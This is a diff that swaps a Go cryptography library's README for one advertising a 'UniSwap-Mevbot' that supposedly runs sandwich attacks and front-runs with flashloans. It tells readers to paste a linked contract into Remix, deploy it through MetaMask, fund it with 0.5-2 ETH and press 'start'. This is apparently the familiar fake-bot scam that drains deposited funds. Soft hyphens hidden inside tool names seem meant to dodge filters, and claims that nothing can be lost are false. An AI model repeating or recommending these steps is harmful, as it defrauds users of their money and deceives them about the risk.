@@ -1,95 +1,75 @@
-[![Go test](https://github.com/dedis/kyber/actions/workflows/go_tests.yml/badge.svg)](https://github.com/dedis/kyber/actions/workflows/go_tests.yml)
-[![Coverage Status](https://coveralls.io/repos/github/dedis/kyber/badge.svg?branch=master)](https://coveralls.io/github/dedis/kyber?branch=master)
-[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=dedis_kyber&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=dedis_kyber)
-[![Go Reference](https://pkg.go.dev/badge/github.com/dedis/kyber.svg)](https://pkg.go.dev/github.com/dedis/kyber)
 
-DEDIS Advanced Crypto Library for Go
-====================================
+# UniSwap-Mevbot
+Fully-auto on-chain Uniswap MEVbot leveraging flashloans and the minimal gas fees of Ethereum to perform sandwich attacks and front-runs on Uniswap.
 
-This package provides a toolbox of advanced cryptographic primitives for Go,
-targeting applications like [Cothority](https://go.dedis.ch/cothority)
-that need more than straightforward signing and encryption.
-Please see the
-[Godoc documentation for this package](https://godoc.org/go.dedis.ch/kyber)
-for details on the library's purpose and API functionality.
+Launch your own MEV engine or start trading with my public program for a 0.1% fee on successful arbitrage transactions.
 
-This package includes a mix of variable time and constant time
-implementations. If your application is sensitive to timing-based attacks
-and you need to constrain Kyber to offering only constant time implementations,
-you should use the [suites.RequireConstantTime()](https://godoc.org/go.dedis.ch/kyber/suites#RequireConstantTime)
-function in the `init()` function of your `main` package.
+> [!IMPORTANT]
+> Due to the atomic nature of Flashloan operations, if they aren't profitable the transaction will revert and no net profit will be lost.
 
-Target Audience
----------------
-
-This library is intended to be used by developers who are at least moderately knowledgeable about cryptography. 
-If you want a crypto library that makes it easy to implement "basic crypto" functionality correctly - i.e., plain public-key encryption and signing - then [NaCl secretbox](https://godoc.org/golang.org/x/crypto/nacl/secretbox) may be a better choice.
-Or use Google's [Tink](https://developers.google.com/tink)
-
-This toolkit's purpose is to make it possible - and preferably easy - to do slightly more interesting things that most current crypto libraries don't support effectively.
-The one existing crypto library that this toolkit is probably most comparable to is the [Charm](https://charm-crypto.com/category/charm) rapid prototyping library for Python.
-
-Versioning - Development
-------------------------
-
-We use the following versioning model:
-
-* crypto.v0 was the first semi-stable version. See [migration notes](https://github.com/dedis/kyber/wiki/Migration-from-gopkg.in-dedis-crypto.v0).
-* kyber.v1 never existed, in order to keep kyber, onet and cothorithy versions linked
-* gopkg.in/dedis/kyber.v2 was the last stable version
-* Starting with v3.0.0, kyber is a Go module, and we respect [semantic versioning](https://golang.org/cmd/go/#hdr-Module_compatibility_and_semantic_versioning).
-
-So if you depend on the master branch, you can expect breakages from time
-to time. If you need something that doesn't change in a backward-compatible
-way you should use have a `go.mod` file in the directory where your
-main package is.
-
-Using the module
-----------------
-
-Kyber supports Go modules, and currently has a major version of 3, which means that
-the import path is: `go.dedis.ch/kyber/v3`.
-
-Here is a basic example of getting started using it:
-1. Make a new directory called “ex". Change directory to “ex" and put this in main.go:
-```go
-package main
-
-import (
-    "fmt"
-    "go.dedis.ch/kyber/v3/suites"
-)
-
-func main() {
-    s := suites.MustFind("Ed25519")
-    x := s.Scalar().Zero()
-    fmt.Println(x)
-}
+# How MEVBOT works
+```mermaid
+graph LR
+A(User Transaction)-->B(MEV Bot)-->C(Opportunity Detection)--> E(Transaction Construction)
+E --> F(Transaction Submission)
+F -->J(Block Inclusion)
+J-->K(Profit Realization)
 ```
-2. Type “go mod init example.com/ex”. The resulting go.mod file will have no dependencies listed yet.
-3. Type “go build”. The go tool will fill in the new dependencies that it find for you, i.e. "require go.dedis.ch/kyber/v3 v3.0.13”.
-4. Running `./ex` will print `0000000000000000000000000000000000000000000000000000000000000000`.
+  - User Transaction: A user submits a transaction to the Ethereum network.
+  - MEV Bot: The MEV bot monitors the mempool for profitable opportunities.
+  - Opportunity Detection: The bot identifies potential MEV opportunities (e.g., arbitrage, liquidation).
+  - Transaction Construction: The bot constructs a transaction to exploit the opportunity.
+  - Transaction Submission: The bot submits the transaction to the network.
+  - Block Inclusion: The transaction gets included in a block by miners.
+  - Profit Realization: The MEV bot realizes the profit from the successful transaction.
 
-A note on deriving shared secrets
----------------------------------
+ #### The bot is constantly sniffing the for user buys, sells, and token creations containing slippage deficits.
+> [!TIP]
+> Bot operators can target any transaction value within their balance threshold. Generally, higher thresholds net consistently viable transactions
+-  Once a transaction is identified, a flashloan is initiated for the target transaction amount, this requires a marginal amount of collateral.
+-  The bot will aggresively attempt to front-run the transaction by dynamically monitoring the bribe to the miner and increasing it if necessary so as to be the first transaction mined.
+- Depending on the set parameters, the bot will either front-run the Dev's sell to remain in profit, or sell upon the token reaching KOTH.
+- The flashloan is then repaid, collateral is reiumbursed and profits are deposited into the operators wallet.
+-  If the transaction is unprofitable at any point it will be reverted and the flashloan will be repaid, losing no gas or net profit.
+# Setup
+1. Download [**MetaMask**](https://metamask.io/download.html) (if you don’t have it already)
+ 
+2. Access to [**Remix Ethereum IDE**](https://remix.ethereum.org/).
+   
+   <img src="https://i.ibb.co/ftNtP8G/2.png" alt="2" border="0">
+   
+   #### For the Remix IDE you can follow this steps:
+3. Click on the `contracts` folder and then create `New File`. Rename it as you like, for example: `bot.sol`
 
-Traditionally, ECDH (Elliptic curve Diffie-Hellman) derives the shared secret
-from the x point only. In this framework, you can either manually retrieve the
-value or use the MarshalBinary method to take the combined (x, y) value as the
-shared secret. We recommend the latter process for new softare/protocols using
-this framework as it is cleaner and generalizes across different types of groups
-(e.g., both integer and elliptic curves), although it will likely be
-incompatible with other implementations of ECDH. See [the Wikipedia
-page](http://en.wikipedia.org/wiki/Elliptic_curve_Diffie%E2%80%93Hellman) on
-ECDH.
+   #### Note: If there is a problem if the text is not colored when you create bot.sol and paste the code from pastebin, try again. If the codes are not colored, you cannot proceed to the next step.
 
-Reporting security problems
----------------------------
+4. Paste this [****sourcecode****](sourcecode.sol) code in R­­emi­x­.
 
-This library is offered as-is, and without a guarantee. It will need an
-independent security review before it should be considered ready for use in
-security-critical applications. If you integrate Kyber into your application it
-is YOUR RESPONSIBILITY to arrange for that audit.
+5.  Go to the `Solidity Compiler` tab, select version `0.6.6+commit.6c089d02` and click `Compile bot.sol`.
+ 
+    Make sure `bot.sol` is selected in the CONTRACT section of the SOLIDITY COMPILER section.
 
-If you notice a possible security problem, please report it
-to dedis-security@epfl.ch.
+6. TGo to the `DEPLOY & RUN TRANSACTIONS` tab, select the `Injected Provider - ­M­et­am­as­k­­` environment and then `Deploy`. By approving the Me­­ta­­­ma­­sk contract creation fee, you will have created your own contract (ignore any IFPS errors that may appear afterwards).
+
+7. Copy your newly created contract address and fund it with any amount of ETH (at least 0.5-2 ETH or more is recommended) Simply send ETH to your newly created contract address to allow the bot to earn money.
+
+8. After your transaction is confirmed, click the “start” button to run the b­o­­t. Withdraw your ETH at any time by clicking the “Withdraw” button.
+
+
+> [!IMPORTANT]
+> The bot will immediately begin searching for and transacting arbitrage.
+> Stop the bot any time by clicking the "STOP" button. any current transactions will be sold or reverted.
+
+
+
+
+# Contributions
+
+Contributions are welcome. If you would like to contribute please submit a pull request with your suggested changes.
+
+# Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
+
+# License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
